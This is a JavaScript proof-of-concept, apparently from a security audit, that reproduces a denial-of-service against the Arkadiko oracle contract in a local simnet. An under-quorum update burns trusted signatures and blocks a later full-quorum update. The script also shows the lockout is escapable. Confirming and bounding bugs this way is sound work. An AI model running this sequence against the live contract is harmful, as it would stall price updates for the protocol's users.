// Gate-2 PoC — Arkadiko oracle #166 cache-before-validate DoS.  [EXECUTED]
// Proves an UNDER-QUORUM update-price-multi call returns (ok false) but COMMITS the
// signatures-used marking; a later FULL-QUORUM call reusing those signatures then reverts
// ERR-SIGNATURES-NOT-UNIQUE (u8403) = oracle-update lockout. Uses GENUINE trusted-oracle
// signatures (@stacks/transactions signMessageHashRsv → matches Clarity secp256k1-recover?).
import { initSimnet } from "@hirosystems/clarinet-sdk";
import { Cl, cvToString, signMessageHashRsv, privateKeyToPublic, compressPublicKey } from "@stacks/transactions";
import { keccak_256 } from "@noble/hashes/sha3.js";

const ORACLE = "arkadiko-oracle-v2-3";
const u256be = (n) => { const b = new Uint8Array(32); let x = BigInt(n); for (let i = 31; i >= 0; i--) { b[i] = Number(x & 0xffn); x >>= 8n; } return b; };
const concat = (...a) => { const t = new Uint8Array(a.reduce((s, x) => s + x.length, 0)); let o = 0; for (const x of a) { t.set(x, o); o += x.length; } return t; };
const hexOf = (u) => Buffer.from(u).toString("hex");

const simnet = await initSimnet("./Clarinet.toml");
const deployer = simnet.deployer;

// 3 oracle node keypairs (Clarity-native signing)
const keys = [1, 2, 3].map((i) => { const priv = hexOf(u256be(0xA11CE000 + i)); return { priv, pub: compressPublicKey(privateKeyToPublic(priv)) }; });
for (const k of keys) {
  const r = simnet.callPublicFn(ORACLE, "set-trusted-oracle", [Cl.bufferFromHex(k.pub), Cl.bool(true)], deployer);
  if (!cvToString(r.result).startsWith("(ok")) throw new Error("set-trusted-oracle failed: " + cvToString(r.result));
}
console.log("setup: 3 trusted oracles registered");

const tokenId = 1, price = 100, decimals = 8;
const msgHashHex = (block) => hexOf(keccak_256(concat(u256be(block), u256be(tokenId), u256be(price), u256be(decimals))));
const sign = (priv, block) => signMessageHashRsv({ messageHash: msgHashHex(block), privateKey: priv });   // RSV, matches Clarity
const isUsed = (sigHex) => cvToString(simnet.callReadOnlyFn(ORACLE, "is-signature-used", [Cl.bufferFromHex(sigHex)], deployer).result);
const mkList = (hexes) => Cl.list(hexes.map((h) => Cl.bufferFromHex(h)));

const block = Number(simnet.burnBlockHeight);              // freshness: burn-block-height < block+10
const sigs = keys.map((k) => sign(k.priv, block));
console.log(`\nblock=${block} minimum-valid-signers=3`);
console.log("each sig recovers to a TRUSTED signer? ",
  keys.map((k, i) => cvToString(simnet.callReadOnlyFn(ORACLE, "check-price-signer", [Cl.uint(block), Cl.uint(tokenId), Cl.uint(price), Cl.uint(decimals), Cl.bufferFromHex(sigs[i])], deployer).result)).join(" "));

// ── STEP 1 — attacker submits UNDER-QUORUM (2 of 3 real trusted sigs) ──
const under = simnet.callPublicFn(ORACLE, "update-price-multi",
  [Cl.uint(block), Cl.uint(tokenId), Cl.uint(price), Cl.uint(decimals), mkList([sigs[0], sigs[1]])], deployer);
console.log("\nSTEP 1 under-quorum (2 trusted sigs) result:", cvToString(under.result), " <-- expect (ok false): 2 < 3, no price update");
console.log("  sig0 used AFTER?", isUsed(sigs[0]), " sig1 used AFTER?", isUsed(sigs[1]), " <-- expect true true: BURNED on the no-op path");

// ── STEP 2 — legitimate keeper submits FULL-QUORUM reusing the burned sigs ──
const full = simnet.callPublicFn(ORACLE, "update-price-multi",
  [Cl.uint(block), Cl.uint(tokenId), Cl.uint(price), Cl.uint(decimals), mkList([sigs[0], sigs[1], sigs[2]])], deployer);
console.log("\nSTEP 2 full-quorum (3 sigs incl. 2 burned) result:", cvToString(full.result), " <-- expect (err u8403) ERR-SIGNATURES-NOT-UNIQUE = lockout");

// ── PART 2 — REPLAY-KEY GRANULARITY (Ogie msg 8101 Task1.3) ──
// signatures-used is keyed by the raw (buff 65) signature, which signs (block,token,price,decimals).
// => a FRESH block gives different sig bytes, NOT pre-consumed => keeper escapes by re-signing.
const block2 = block + 1;
const sigs2 = keys.map((k) => sign(k.priv, block2));
const preUsed2 = isUsed(sigs2[0]);
console.log("\nPART 2 — replay-key granularity:");
console.log("  fresh-block sig0 pre-consumed?", preUsed2, " <-- expect false (key = signature buffer, per exact message)");
const escape = simnet.callPublicFn(ORACLE, "update-price-multi",
  [Cl.uint(block2), Cl.uint(tokenId), Cl.uint(price), Cl.uint(decimals), mkList([sigs2[0], sigs2[1], sigs2[2]])], deployer);
console.log("  keeper re-signs fresh block -> full-quorum result:", cvToString(escape.result), " <-- expect (ok true): lockout is per-message, escapable");

// ── verdict ──
const p1 = cvToString(under.result) === "(ok false)";
const p2 = isUsed(sigs[0]) === "true" && isUsed(sigs[1]) === "true";
const p3 = cvToString(full.result) === "(err u8403)";
const p4 = preUsed2 === "false" && cvToString(escape.result) !== "(err u8403)";
console.log("\n=== PoC RESULT ===");
console.log(`  [${p1 ? "PASS" : "FAIL"}] under-quorum (2 trusted sigs) returned (ok false) — success response, no update`);
console.log(`  [${p2 ? "PASS" : "FAIL"}] both trusted signatures marked 'used' despite no price update (cache-before-validate, not unwound)`);
console.log(`  [${p3 ? "PASS" : "FAIL"}] legitimate full-quorum update reverted ERR-SIGNATURES-NOT-UNIQUE = oracle lockout`);
console.log(`  [${p4 ? "PASS" : "FAIL"}] replay-key = per-(block,price) signature; keeper escapes by re-signing a fresh block (=> Medium, recoverable)`);
console.log((p1 && p2 && p3 && p4) ? "\n>>> 4/4 PASS — #166 oracle-update DoS CONFIRMED [EXECUTED]; severity-bounding (escapable) also proven" : "\n>>> review");
